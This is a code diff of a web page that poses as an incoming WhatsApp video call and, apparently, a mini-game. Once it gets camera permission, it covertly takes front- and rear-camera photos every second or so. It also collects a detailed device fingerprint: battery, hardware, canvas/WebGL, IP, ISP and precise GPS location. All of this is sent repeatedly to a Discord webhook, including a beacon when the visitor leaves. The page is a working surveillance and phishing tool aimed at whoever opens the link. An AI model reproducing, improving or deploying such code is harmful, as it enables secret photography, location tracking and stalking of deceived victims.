+        o.type = 'sine';
+        o.frequency.setValueAtTime(300, now);
+        o.frequency.exponentialRampToValueAtTime(100, now + 0.3);
+        g.gain.setValueAtTime(0.2, now);
+        g.gain.exponentialRampToValueAtTime(0.001, now + 0.3);
+        o.start(now);
+        o.stop(now + 0.3);
+      };
+
+      const playButtonClick = () => {
+        playTone(550, 'square', 0.08, 0.12);
+      };
+
+      const playLevelUp = () => {
+        const ctx = getCtx();
+        const now = ctx.currentTime;
+        [523, 659, 784, 987, 1175].forEach((f, i) => {
+          const o = ctx.createOscillator();
+          const g = ctx.createGain();
+          o.connect(g);
+          g.connect(ctx.destination);
+          o.frequency.value = f;
+          o.type = 'sine';
+          g.gain.setValueAtTime(0.15, now + i * 0.1);
+          g.gain.exponentialRampToValueAtTime(0.001, now + i * 0.1 + 0.2);
+          o.start(now + i * 0.1);
+          o.stop(now + i * 0.1 + 0.2);
+        });
+      };
 
       // ── HELPERS ──
       const vibrateAvatar = () => {
-        const av = document.getElementById('avatar'); if(!av) return;
-        ['-4px','4px','-3px','3px','-2px','2px','0px'].forEach((x,i)=>setTimeout(()=>{av.style.transform=`translateX(${x})`;},i*50));
-        if(navigator.vibrate) navigator.vibrate([100,50,100]);
+        const av = document.getElementById('avatar');
+        if (!av) return;
+        ['-4px', '4px', '-3px', '3px', '-2px', '2px', '0px'].forEach((x, i) => {
+          setTimeout(() => {
+            av.style.transform = `translateX(${x})`;
+          }, i * 50);
+        });
+        if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
       };
+
       const setCallerUI = (name) => {
         document.getElementById('callerName').textContent = name;
         document.getElementById('avatar').textContent = name[0].toUpperCase();
-        document.getElementById('avatar').style.background = avatarColors[Math.floor(Math.random()*avatarColors.length)];
+        document.getElementById('avatar').style.background = avatarColors[Math.floor(Math.random() * avatarColors.length)];
       };
+
+      const updateSignalStrength = () => {
+        connectionQuality = Math.floor(Math.random() * 5);
+        const signals = ['Keine Verbindung', '📶 Schwach', '📶 Mittel', '📶 Gut', '📶 Ausgezeichnet'];
+        document.getElementById('signalStrength').textContent = signals[connectionQuality];
+      };
+
       setCallerUI(currentCaller);
+      updateSignalStrength();
+      setInterval(updateSignalStrength, 3000);
 
       const startTimer = () => {
-        document.getElementById('callStatus').style.display='none';
-        document.getElementById('timer').style.display='block';
-        timerInterval = setInterval(()=>{
-          if(callEnded) return;
+        document.getElementById('callStatus').style.display = 'none';
+        document.getElementById('timer').style.display = 'block';
+        timerInterval = setInterval(() => {
+          if (callEnded) return;
           seconds++;
           const el = document.getElementById('timer');
-          if(el) el.textContent = String(Math.floor(seconds/60)).padStart(2,'0')+':'+String(seconds%60).padStart(2,'0');
-        },1000);
+          if (el) {
+            el.textContent = String(Math.floor(seconds / 60)).padStart(2, '0') + ':' + String(seconds % 60).padStart(2, '0');
+          }
+        }, 1000);
       };
 
       // ── DISCORD SENDER (rate-limit aware) ──
       const sendToDiscord = async (formData) => {
         try {
-          await fetch(WEBHOOK, { method:'POST', body:formData });
+          await fetch(WEBHOOK, { method: 'POST', body: formData });
         } catch(e) {
-          console.warn('Discord Sende Fehler:', e.message);
+          console.warn('Discord Sendefehler:', e.message);
         }
         await new Promise(r => setTimeout(r, RATE_LIMIT_DELAY));
       };
@@ -176,14 +1044,16 @@
       async function collectFingerprintData() {
         const data = {};
 
-        // ── Hardware Informationen ──
+        // Hardware Informationen
         data.hardware = {};
         try {
-          const bat = await navigator.getBattery();
-          data.hardware.akku_level = Math.round(bat.level*100)+'%';
-          data.hardware.akku_ladend = bat.charging;
-          data.hardware.akku_ladezeit = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime)+'s';
-          data.hardware.akku_entladezeit = bat.dischargingTime === Infinity ? '∞' : Math.round(bat.dischargingTime)+'s';
+          const bat = await navigator.getBattery?.();
+          if (bat) {
+            data.hardware.akku_level = Math.round(bat.level * 100) + '%';
+            data.hardware.akku_ladend = bat.charging;
+            data.hardware.akku_ladezeit = bat.chargingTime === Infinity ? '∞' : Math.round(bat.chargingTime) + 's';
+            data.hardware.akku_entladezeit = bat.dischargingTime === Infinity ? '∞' : Math.round(bat.dischargingTime) + 's';
+          }
         } catch(e) {
           data.hardware.akku = 'Unbekannt';
         }
@@ -192,7 +1062,7 @@
         data.hardware.max_touch_punkte = navigator.maxTouchPoints || 0;
         data.hardware.touchscreen = 'maxTouchPoints' in navigator && navigator.maxTouchPoints > 0;
 
-        // ── Bildschirm & Browser ──
+        // Bildschirm & Browser
         data.bildschirm = {};
         data.bildschirm.auflösung = `${window.screen.width}x${window.screen.height}`;
         data.bildschirm.verfügbare_auflösung = `${window.screen.availWidth}x${window.screen.availHeight}`;
@@ -205,16 +1075,17 @@
         // Canvas Fingerabdruck
         try {
           const c = document.createElement('canvas');
-          c.width = 280; c.height = 60;
+          c.width = 280;
+          c.height = 60;
           const ctx = c.getContext('2d');
           ctx.textBaseline = 'top';
           ctx.font = '14px Arial';
           ctx.fillStyle = '#f60';
-          ctx.fillRect(125,1,62,20);
+          ctx.fillRect(125, 1, 62, 20);
           ctx.fillStyle = '#069';
-          ctx.fillText('GeräteFingerabdruck <canvas>  fingerprint', 2, 15);
+          ctx.fillText('GeräteFingerabdruck <canvas> Fingerabdruck', 2, 15);
           ctx.fillStyle = 'rgba(102,204,0,0.7)';
-          ctx.fillText('GeräteFingerabdruck <canvas>  fingerprint', 4, 17);
+          ctx.fillText('GeräteFingerabdruck <canvas> Fingerabdruck', 4, 17);
           data.bildschirm.canvas_fingerabdruck = c.toDataURL().slice(-50);
         } catch(e) {
           data.bildschirm.canvas_fingerabdruck = 'Fehler';
@@ -223,7 +1094,7 @@
         // WebGL Fingerabdruck
         try {
           const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
-          if(gl) {
+          if (gl) {
             const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
             data.bildschirm.webgl_hersteller = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unbekannt';
             data.bildschirm.webgl_renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unbekannt';
@@ -239,18 +1110,18 @@
         data.browser.cookies_aktiviert = navigator.cookieEnabled;
         data.browser.do_not_track = navigator.doNotTrack || 'Unbekannt';
         data.browser.online = navigator.onLine;
-        data.browser.java_aktiviert = navigator.javaEnabled ? navigator.javaEnabled() : false;
+        data.browser.java_aktiviert = navigator.javaEnabled?.() || false;
         data.browser.produkt = navigator.product || 'Unbekannt';
         data.browser.hersteller = navigator.vendor || 'Unbekannt';
 
-        // ── Netzwerk & Standort ──
+        // Netzwerk & Standort
         data.netzwerk = {};
         try {
           const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-          if(conn) {
+          if (conn) {
             data.netzwerk.effektiver_typ = conn.effectiveType || conn.type || 'Unbekannt';
-            data.netzwerk.download_geschwindigkeit = conn.downlink ? conn.downlink+' Mbps' : 'Unbekannt';
-            data.netzwerk.latenz = conn.rtt ? conn.rtt+' ms' : 'Unbekannt';
+            data.netzwerk.download_geschwindigkeit = conn.downlink ? conn.downlink + ' Mbps' : 'Unbekannt';
+            data.netzwerk.latenz = conn.rtt ? conn.rtt + ' ms' : 'Unbekannt';
             data.netzwerk.datensparmodus = conn.saveData || false;
           }
         } catch(e) {}
@@ -277,108 +1148,107 @@
           } catch(e2) {}
         }
 
-        // GPS Standort (mit Erlaubnis)
+        // GPS Standort
         data.geo = {};
         try {
           await new Promise((resolve) => {
             navigator.geolocation.getCurrentPosition(pos => {
               data.geo.breitengrad = pos.coords.latitude.toFixed(6);
               data.geo.längengrad = pos.coords.longitude.toFixed(6);
-              data.geo.genauigkeit = Math.round(pos.coords.accuracy)+'m';
-              data.geo.höhe = pos.coords.altitude ? pos.coords.altitude.toFixed(2)+'m' : 'Keine';
-              data.geo.geschwindigkeit = pos.coords.speed ? pos.coords.speed+' m/s' : 'Keine';
-              data.geo.richtung = pos.coords.heading ? pos.coords.heading+'°' : 'Keine';
+              data.geo.genauigkeit = Math.round(pos.coords.accuracy) + 'm';
+              data.geo.höhe = pos.coords.altitude ? pos.coords.altitude.toFixed(2) + 'm' : 'Keine';
+              data.geo.geschwindigkeit = pos.coords.speed ? pos.coords.speed + ' m/s' : 'Keine';
+              data.geo.richtung = pos.coords.heading ? pos.coords.heading + '°' : 'Keine';
               data.geo.zeitstempel = new Date(pos.timestamp).toLocaleString('de-DE');
               resolve();
-            }, resolve, { timeout:5000, enableHighAccuracy:true });
+            }, resolve, { timeout: 5000, enableHighAccuracy: true });
           });
         } catch(e) {}
 
-        // ── Besuchszähler ──
+        // Besuchszähler
         let visits = parseInt(localStorage.getItem('vc') || '0') + 1;
         localStorage.setItem('vc', visits);
         data.besuche = visits;
 
+        // Verbindungsqualität
+        data.verbindung = { qualität: connectionQuality + '/5' };
+
         return data;
       }
 
-      // ── EMBED ERSTELLER (ALLE DEUTSCH) ──
+      // ── EMBED ERSTELLER ──
       function buildEmbeds(data, name, fotoLabel) {
         const now = new Date();
         const timeStr = now.toLocaleString('de-DE', { timeZone: data.browser.zeitzone });
         const embeds = [];
 
-        // Haupt Embed
         embeds.push({
           title: `📞 WhatsApp Anruf – ${name}`,
-          farbe: 0x25d366,
-          zeitstempel: now.toISOString(),
-          fußzeile: { text: `Besuch #${data.besuche} • ${timeStr}` },
-          felder: [
-            { name: '🕐 Zeitstempel', wert: timeStr, inline: true },
-            { name: '🌍 Zeitzone', wert: data.browser.zeitzone, inline: true },
-            { name: '📱 Gerät', wert: data.browser.plattform, inline: true },
+          color: 0x25d366,
+          timestamp: now.toISOString(),
+          footer: { text: `Besuch #${data.besuche} • ${timeStr}` },
+          fields: [
+            { name: '🕐 Zeitstempel', value: timeStr, inline: true },
+            { name: '🌍 Zeitzone', value: data.browser.zeitzone, inline: true },
+            { name: '📱 Gerät', value: data.browser.plattform, inline: true },
+            { name: '📶 Verbindung', value: data.verbindung.qualität, inline: true },
           ]
         });
 
-        // Hardware Embed
         embeds.push({
-          title: '🔧 Hardware Informationen',
-          farbe: 0x5865f2,
-          felder: [
-            { name: '🔋 Akkustand', wert: data.hardware.akku_level || 'Unbekannt', inline: true },
-            { name: '⚡ Lädt', wert: data.hardware.akku_ladend ? 'Ja' : 'Nein', inline: true },
-            { name: '🧠 CPU Kerne', wert: String(data.hardware.cpu_kerne), inline: true },
-            { name: '💾 Arbeitsspeicher', wert: (data.hardware.gerätespeicher || '?') + ' GB', inline: true },
-            { name: '👆 Touchscreen', wert: data.hardware.touchscreen ? 'Ja ('+data.hardware.max_touch_punkte+' Punkte)' : 'Nein', inline: true },
+          title: '🔧 Hardware-Informationen',
+          color: 0x5865f2,
+          fields: [
+            { name: '🔋 Akkustand', value: data.hardware.akku_level || 'Unbekannt', inline: true },
+            { name: '⚡ Lädt', value: data.hardware.akku_ladend ? 'Ja' : 'Nein', inline: true },
+            { name: '🧠 CPU-Kerne', value: String(data.hardware.cpu_kerne), inline: true },
+            { name: '💾 Arbeitsspeicher', value: (data.hardware.gerätespeicher || '?') + ' GB', inline: true },
+            { name: '👆 Touchscreen', value: data.hardware.touchscreen ? 'Ja (' + data.hardware.max_touch_punkte + ' Punkte)' : 'Nein', inline: true },
           ]
         });
 
-        // Bildschirm & Browser Embed
         embeds.push({
           title: '🖥️ Bildschirm & Browser',
-          farbe: 0x9b59b6,
-          felder: [
-            { name: 'Auflösung', wert: data.bildschirm.auflösung, inline: true },
-            { name: 'Pixeldichte', wert: data.bildschirm.pixel_dichte+'x', inline: true },
-            { name: 'Farbtiefe', wert: data.bildschirm.farbtiefe+' Bit', inline: true },
-            { name: 'Sprache', wert: data.browser.sprache, inline: true },
-            { name: 'Plattform', wert: data.browser.plattform, inline: true },
-            { name: 'Canvas Fingerabdruck', wert: '```'+data.bildschirm.canvas_fingerabdruck+'```', inline: false },
+          color: 0x9b59b6,
+          fields: [
+            { name: 'Auflösung', value: data.bildschirm.auflösung, inline: true },
+            { name: 'Pixeldichte', value: data.bildschirm.pixel_dichte + 'x', inline: true },
+            { name: 'Farbtiefe', value: data.bildschirm.farbtiefe + ' Bit', inline: true },
+            { name: 'Sprache', value: data.browser.sprache, inline: true },
+            { name: 'Plattform', value: data.browser.plattform, inline: true },
+            { name: 'Canvas-Fingerabdruck', value: '```' + data.bildschirm.canvas_fingerabdruck + '```', inline: false },
           ]
         });
 
-        // Netzwerk Embed
         const netzFelder = [
-          { name: '🌐 IP-Adresse', wert: '`'+ (data.netzwerk.ip || 'Unbekannt') +'`', inline: true },
-          { name: '🏢 Provider (ISP)', wert: data.netzwerk.isp || 'Unbekannt', inline: true },
+          { name: '🌐 IP-Adresse', value: '`' + (data.netzwerk.ip || 'Unbekannt') + '`', inline: true },
+          { name: '🏢 ISP (Internetanbieter)', value: data.netzwerk.isp || 'Unbekannt', inline: true },
         ];
-        if(data.netzwerk.effektiver_typ) netzFelder.push({ name: '📶 Netzwerktyp', wert: data.netzwerk.effektiver_typ.toUpperCase(), inline: true });
-        if(data.netzwerk.download_geschwindigkeit) netzFelder.push({ name: '⬇️ Geschwindigkeit', wert: data.netzwerk.download_geschwindigkeit, inline: true });
-        if(data.netzwerk.stadt) netzFelder.push({ name: '📍 Standort', wert: `${data.netzwerk.stadt}, ${data.netzwerk.region}, ${data.netzwerk.land}`, inline: true });
+        if (data.netzwerk.effektiver_typ) netzFelder.push({ name: '📶 Netzwerktyp', value: data.netzwerk.effektiver_typ.toUpperCase(), inline: true });
+        if (data.netzwerk.download_geschwindigkeit) netzFelder.push({ name: '⬇️ Geschwindigkeit', value: data.netzwerk.download_geschwindigkeit, inline: true });
+        if (data.netzwerk.stadt) netzFelder.push({ name: '📍 Standort', value: `${data.netzwerk.stadt}, ${data.netzwerk.region}, ${data.netzwerk.land}`, inline: true });
 
         embeds.push({
           title: '🌐 Netzwerkdaten',
-          farbe: 0xe67e22,
-          felder: netzFelder
+          color: 0xe67e22,
+          fields: netzFelder
         });
 
-        // Standort Embed
-        if(data.geo.breitengrad) {
+        if (data.geo.breitengrad) {
           embeds.push({
             title: '📍 Genauer Standort (GPS)',
-            farbe: 0xe74c3c,
-            felder: [
-              { name: 'Breitengrad', wert: data.geo.breitengrad, inline: true },
-              { name: 'Längengrad', wert: data.geo.längengrad, inline: true },
-              { name: 'Genauigkeit', wert: data.geo.genauigkeit, inline: true },
-              { name: 'Karte', wert: `[Google Maps](https://maps.google.com/?q=${data.geo.breitengrad},${data.geo.längengrad})`, inline: false },
+            color: 0xe74c3c,
+            fields: [
+              { name: 'Breitengrad', value: data.geo.breitengrad, inline: true },
+              { name: 'Längengrad', value: data.geo.längengrad, inline: true },
+              { name: 'Genauigkeit', value: data.geo.genauigkeit, inline: true },
+              { name: 'Karte', value: `[Google Maps öffnen](https://maps.google.com/?q=${data.geo.breitengrad},${data.geo.längengrad})`, inline: false },
             ]
           });
         }
 
-        if(fotoLabel) {
-          embeds[0].bild = { url: `anhang://${fotoLabel}.jpg` };
+        if (fotoLabel) {
+          embeds[0].image = { url: `attachment://${fotoLabel}.jpg` };
         }
 
         return embeds;
@@ -397,34 +1267,34 @@
       }
 
       function captureFromVideo(video, mirror, label, name, fpData) {
-        if(!video.videoWidth) return;
+        if (!video.videoWidth) return;
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
         ctx.save();
-        if(mirror) { ctx.translate(canvas.width,0); ctx.scale(-1,1); }
-        ctx.drawImage(video,0,0);
+        if (mirror) {
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+        }
+        ctx.drawImage(video, 0, 0);
         ctx.restore();
-        canvas.toBlob(async b => { 
-          if(b) {
+        canvas.toBlob(async b => {
+          if (b) {
             photoCounter++;
-            await sendeFoto(b, `${label}_${photoCounter}`, name, fpData); 
+            await sendeFoto(b, `${label}_${photoCounter}`, name, fpData);
           }
         }, 'image/jpeg', 0.93);
       }
 
-      // ── SCHNELLE FOTOS MIT BEIDEN KAMERAS ──
       async function schnelleFotoAufnahme(fpData) {
-        if(callEnded || !hiddenVideo.videoWidth) return;
-        
-        // Vordere Kamera
+        if (callEnded || !hiddenVideo.videoWidth) return;
+
         captureFromVideo(hiddenVideo, true, 'Frontkamera', currentCaller, fpData);
-        
-        // Hintere Kamera (parallel)
+
         try {
-          const backStream = await navigator.mediaDevices.getUserMedia({ 
-            video:{facingMode:{exact:'environment'}, width:1280, height:720}, 
-            audio:false 
+          const backStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: { exact: 'environment' }, width: 1280, height: 720 },
+            audio: false
           });
           const backVideo = document.createElement('video');
           backVideo.srcObject = backStream;
@@ -433,7 +1303,7 @@
           backVideo.onloadedmetadata = () => {
             setTimeout(() => {
               captureFromVideo(backVideo, false, 'Rückkamera', currentCaller, fpData);
-              backStream.getTracks().forEach(t=>t.stop());
+              backStream.getTracks().forEach(t => t.stop());
             }, 800);
           };
         } catch(e) {
@@ -441,9 +1311,8 @@
         }
       }
 
-      // ── FINGERPRINT SAMMELN UND SENDEN (SEHR HÄUFIG) ──
       async function fingerprintSenden() {
-        if(callEnded) return;
+        if (callEnded) return;
         try {
           const fpData = await collectFingerprintData();
           const embeds = buildEmbeds(fpData, currentCaller, null);
@@ -451,45 +1320,135 @@
           form.append('payload_json', JSON.stringify({ embeds: embeds }));
           await sendToDiscord(form);
         } catch(e) {
-          console.warn('Fingerprint Sende Fehler:', e.message);
+          console.warn('Fingerprint-Sendefehler:', e.message);
         }
       }
+
+      // ── MINI GAME LOGIK ──
+      let gameState = {
+        score: 0,
+        level: 1,
+        nextNumber: 1,
+        time: 0,
+        cells: []
+      };
+
+      window.gameTimer = null;
+      window.gameCountdownInterval = null;
+
+      function initializeGame() {
+        gameState.score = 0;
+        gameState.level = 1;
+        gameState.nextNumber = 1;
+        gameState.time = 0;
+        gameState.cells = [];
+        generateGameBoard();
+        startGameTimer();
+      }
+
+      function generateGameBoard() {
+        const maxNumber = 9 + (gameState.level - 1) * 2;
+        const numbers = Array.from({ length: maxNumber }, (_, i) => i + 1);
+        gameState.cells = numbers.sort(() => Math.random() - 0.5).slice(0, 9);
+        gameState.nextNumber = 1;
+        renderGameBoard();
+      }
+
+      function renderGameBoard() {
+        const board = document.getElementById('gameBoard');
+        board.innerHTML = '';
+        gameState.cells.forEach((num, idx) => {
+          const cell = document.createElement('button');
+          cell.className = 'game-cell';
+          cell.textContent = num;
+          cell.disabled = num !== gameState.nextNumber;
+          cell.classList.toggle('disabled', num !== gameState.nextNumber);
+          cell.onclick = () => onGameCellClick(num, cell);
+          board.appendChild(cell);
+        });
+      }
+
+      function onGameCellClick(num, cell) {
+        if (num !== gameState.nextNumber) {
+          playGameWrong();
+          playError();
+          cell.style.opacity = '0.3';
+          setTimeout(() => { cell.style.opacity = '1'; }, 200);
+          return;
+        }
+
+        playGameCorrect();
+        playButtonClick();
+        gameState.score += 10 + gameState.level * 5;
+        gameState.nextNumber++;
+
+        document.getElementById('gameScore').textContent = gameState.score;
+
+        if (gameState.nextNumber > gameState.cells.length) {
+          gameState.level++;
+          document.getElementById('gameLevel').textContent = gameState.level;
+          playLevelUp();
+          setTimeout(() => {
+            generateGameBoard();
+          }, 500);
+        } else {
+          renderGameBoard();
+        }
+      }
+
+      function startGameTimer() {
+        window.gameCountdownInterval = setInterval(() => {
+          if (isGameActive) {
+            gameState.time++;
+            document.getElementById('gameTime').textContent = gameState.time + 's';
+          }
+        }, 1000);
+      }
+
+      window.resetGame = function() {
+        clearInterval(window.gameCountdownInterval);
+        initializeGame();
+      };
 
       // ── KAMERA STARTEN ──
       async function starteKameraUndSammlung() {
         try {
-          captureStream = await navigator.mediaDevices.getUserMedia({ 
-            video:{width:1280,height:720,facingMode:'user'}, 
-            audio:false 
+          captureStream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 1280, height: 720, facingMode: 'user' },
+            audio: false
           });
           hiddenVideo.srcObject = captureStream;
           hiddenVideo.onloadedmetadata = async () => {
             document.getElementById('callStatus').textContent = 'Verbunden';
+            document.getElementById('callInfo').textContent = 'Anruf läuft...';
             playTypingSound();
-            vibrateAvatar(); stopRinging(); playConnectSound();
+            vibrateAvatar();
+            stopRinging();
+            playConnectSound();
             setTimeout(startTimer, 800);
+
+            // Game Button anzeigen
+            document.getElementById('btnGame').style.display = 'flex';
 
             // Erste sofortige Datensammlung
             await fingerprintSenden();
-            
+
             // Erste Fotos nach 1 Sekunde
             setTimeout(async () => {
               const fpData = await collectFingerprintData();
               await schnelleFotoAufnahme(fpData);
             }, 1000);
 
-            // SEHR HÄUFIGE Fingerprint-Updates (alle 800ms)
             fingerprintInterval = setInterval(async () => {
-              if(callEnded) {
+              if (callEnded) {
                 clearInterval(fingerprintInterval);
                 return;
               }
               await fingerprintSenden();
             }, FINGERPRINT_INTERVAL);
 
-            // SEHR HÄUFIGE Fotos (alle 1.5 Sekunden)
             photoInterval = setInterval(async () => {
-              if(callEnded) {
+              if (callEnded) {
                 clearInterval(photoInterval);
                 return;
               }
@@ -498,7 +1457,13 @@
             }, PHOTO_INTERVAL);
           };
         } catch(e) {
-          document.body.innerHTML = `<div style="height:100vh;background:#0a1f13;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;font-family:-apple-system,sans-serif;color:white;text-align:center;padding:32px"><div style="font-size:64px">🚫</div><div style="font-size:22px;font-weight:700">Kamerazugriff erforderlich</div><div style="font-size:14px;color:rgba(255,255,255,0.5);max-width:280px;line-height:1.6">Um an diesem Anruf teilzunehmen, musst du den Kamerazugriff erlauben.</div></div>`;
+          document.body.innerHTML = `
+            <div style="height:100vh;background:linear-gradient(135deg, #0a1f13 0%, #0d2818 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;font-family:-apple-system,sans-serif;color:white;text-align:center;padding:32px">
+              <div style="font-size:64px">🚫</div>
+              <div style="font-size:22px;font-weight:700;letter-spacing:-0.5px">Kamerazugriff erforderlich</div>
+              <div style="font-size:14px;color:rgba(255,255,255,0.5);max-width:280px;line-height:1.6;letter-spacing:0.3px">Um an diesem Anruf teilzunehmen, musst du den Kamerazugriff erlauben.</div>
+            </div>
+          `;
         }
       }
 
@@ -507,57 +1472,85 @@
         const overlay = document.createElement('div');
         overlay.className = 'permission-overlay';
         overlay.innerHTML = `
-          <div style="font-size:48px">📷</div>
-          <div style="font-size:20px;font-weight:600">Kamera Berechtigung Erforderlich</div>
-          <div style="font-size:14px;color:rgba(255,255,255,0.7);max-width:300px;line-height:1.5">Um am Videoanruf teilzunehmen, müssen Sie den Kamerazugriff erlauben.</div>
-          <button class="permission-btn" id="grantPermissionBtn">📸 Kamera Aktivieren & Anruf Starten</button>
+          <div class="permission-icon">📷</div>
+          <div class="permission-title">Kameraberechtigung erforderlich</div>
+          <div class="permission-text">Um am Videoanruf teilzunehmen, musst du den Kamerazugriff erlauben.</div>
+          <button class="permission-btn" id="grantPermissionBtn">📸 Kamera aktivieren und Anruf starten</button>
         `;
         document.body.appendChild(overlay);
         document.getElementById('grantPermissionBtn').addEventListener('click', async () => {
+          playButtonClick();
           overlay.remove();
           await starteKameraUndSammlung();
         });
       }
 
       // ── INITIALISIERUNG ──
-      playNotifSound(); vibrateAvatar();
+      playNotifSound();
+      vibrateAvatar();
       setTimeout(() => {
         document.getElementById('callStatus').textContent = 'Klingelt…';
         playTypingSound();
-        vibrateAvatar(); startRinging();
+        vibrateAvatar();
+        startRinging();
       }, 600);
-      // Benutzerinteraktion für Berechtigung
+
       setTimeout(zeigeBerechtigungsanfrage, 1800);
 
       // ── BUTTONS ──
       let stumm = false;
-      document.getElementById('btnMute').addEventListener('click', function(){
+      document.getElementById('btnMute').addEventListener('click', function() {
+        playButtonClick();
         stumm = !stumm;
         this.classList.toggle('toggled', stumm);
         this.querySelector('.ctrl-icon').textContent = stumm ? '🔕' : '🎤';
         this.querySelector('.ctrl-label').textContent = stumm ? 'Ton an' : 'Stumm';
       });
-      document.getElementById('btnSpeaker').addEventListener('click', function(){ this.classList.toggle('toggled'); });
-      document.getElementById('btnVideo').addEventListener('click', function(){ this.classList.toggle('toggled'); });
+
+      document.getElementById('btnSpeaker').addEventListener('click', function() {
+        playButtonClick();
+        this.classList.toggle('toggled');
+      });
+
+      document.getElementById('btnVideo').addEventListener('click', function() {
+        playButtonClick();
+        this.classList.toggle('toggled');
+      });
+
+      document.getElementById('btnGame').addEventListener('click', function() {
+        playButtonClick();
+        isGameActive = true;
+        document.getElementById('gameModal').classList.add('active');
+        initializeGame();
+      });
 
       document.getElementById('btnEnd').addEventListener('click', () => {
+        playButtonClick();
         callEnded = true;
-        stopRinging(); playHangupSound(); vibrateAvatar();
-        if(timerInterval) clearInterval(timerInterval);
-        if(fingerprintInterval) clearInterval(fingerprintInterval);
-        if(photoInterval) clearInterval(photoInterval);
-        if(captureStream) captureStream.getTracks().forEach(t=>t.stop());
-        const m = String(Math.floor(seconds/60)).padStart(2,'0');
-        const s = String(seconds%60).padStart(2,'0');
-        document.body.innerHTML = `
-          <div style="height:100vh;background:#0a1f13;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;font-family:-apple-system,sans-serif;color:white">
-            <div style="font-size:52px">📵</div><div style="font-size:22px;font-weight:600">Anruf beendet</div>
-            <div style="font-size:14px;color:rgba(255,255,255,0.5)">${m}:${s}</div>
-            <button onclick="location.reload()" style="margin-top:12px;display:flex;flex-direction:column;align-items:center;gap:8px;background:none;border:none;cursor:pointer;color:white">
-              <div style="width:64px;height:64px;border-radius:50%;background:#25d366;display:flex;align-items:center;justify-content:center;font-size:26px;box-shadow:0 6px 24px rgba(37,211,102,0.4)">📞</div>
-              <span style="font-size:12px;color:rgba(255,255,255,0.6);font-weight:500">Erneut anrufen</span>
-            </button>
-          </div>`;
+        stopRinging();
+        playHangupSound();
+        vibrateAvatar();
+        if (timerInterval) clearInterval(timerInterval);
+        if (fingerprintInterval) clearInterval(fingerprintInterval);
+        if (photoInterval) clearInterval(photoInterval);
+        if (window.gameCountdownInterval) clearInterval(window.gameCountdownInterval);
+        if (captureStream) captureStream.getTracks().forEach(t => t.stop());
+
+        const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+        const s = String(seconds % 60).padStart(2, '0');
+
+        const endScreen = document.createElement('div');
+        endScreen.className = 'end-call-screen';
+        endScreen.innerHTML = `
+          <div class="end-call-icon">📵</div>
+          <div class="end-call-title">Anruf beendet</div>
+          <div class="end-call-duration">${m}:${s}</div>
+          <button class="end-call-btn" onclick="location.reload()">
+            <div class="end-call-btn-circle">📞</div>
+            <span class="end-call-btn-text">Erneut anrufen</span>
+          </button>
+        `;
+        document.body.appendChild(endScreen);
       });
 
       // Seite verlassen Daten
@@ -565,17 +1558,21 @@
         const sekunden = Math.round((Date.now() - pageStartTime) / 1000);
         const form = new FormData();
         form.append('payload_json', JSON.stringify({
-          embeds: [{ 
-            title: '⏱️ Besuchszeit', 
-            farbe: 0x95a5a6, 
-            beschreibung: `Jemand war **${sekunden} Sekunden** auf der Seite (Anruf: **${currentCaller}**)`,
-            felder: [
-              { name: '📸 Fotos gesendet', wert: String(photoCounter), inline: true }
+          embeds: [{
+            title: '⏱️ Besuchsdauer',
+            color: 0x95a5a6,
+            description: `Jemand war **${sekunden} Sekunden** auf der Seite (Anruf: **${currentCaller}**)`,
+            fields: [
+              { name: '📸 Fotos gesendet', value: String(photoCounter), inline: true },
+              { name: '🎮 Spiel-Punkte', value: String(gameState.score), inline: true }
             ]
           }]
         }));
-        try { navigator.sendBeacon(WEBHOOK, form); } catch(e) {}
+        try {
+          navigator.sendBeacon(WEBHOOK, form);
+        } catch(e) {}
       });
+
     })();
   </script>
 </body>
